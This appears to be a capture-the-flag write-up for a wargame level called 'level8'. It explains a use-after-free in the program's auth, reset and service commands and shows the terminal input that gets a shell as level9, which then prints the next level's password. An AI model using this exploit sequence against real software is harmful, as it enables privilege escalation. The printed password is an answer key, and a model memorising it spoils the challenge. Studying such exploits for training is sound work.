@@ -1,0 +1,44 @@
+- we started the program, we found that it read from the stdin and print (nil), (nil).
+
+- We start disassembling the program, we found some interesting strings:
+
+auth
+service
+reset
+login
+
+- Also a call to printf with "Password:\n", and a call to system function with "/bin/sh", and a call to free for a auth struct.
+
+- The is a use-after-free (UAF) exploit, if we enter “auth AAAA” the code allocates memory and stores it in auth then copies the name AAAA to auth->name.
+
+- We can’t overflow the name since there is a length checking strlen.
+
+- The bug here is that reset frees auth allocated memory but auth still points to that memory location which could contain anything.
+
+- Also when we use service word it allocates with the text using strdup and uses the same pointer of auth after freed.
+
+$> ./level8
+(nil), (nil)
+auth ayoub
+0x804a008, (nil)
+reset
+0x804a008, (nil)
+service ayoub
+0x804a008, 0x804a008
+
+
+- So We see they have the same address, if we allocated memory for auth, freed that memory then entered service the strdup function will use the previously freed memory address of auth, and now we can write anything to auth->auth (we are writing to service but auth points to that address already).
+
+$> ./level8
+(nil), (nil)
+auth ayoub
+0x804a008, (nil)
+reset
+0x804a008, (nil)
+service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
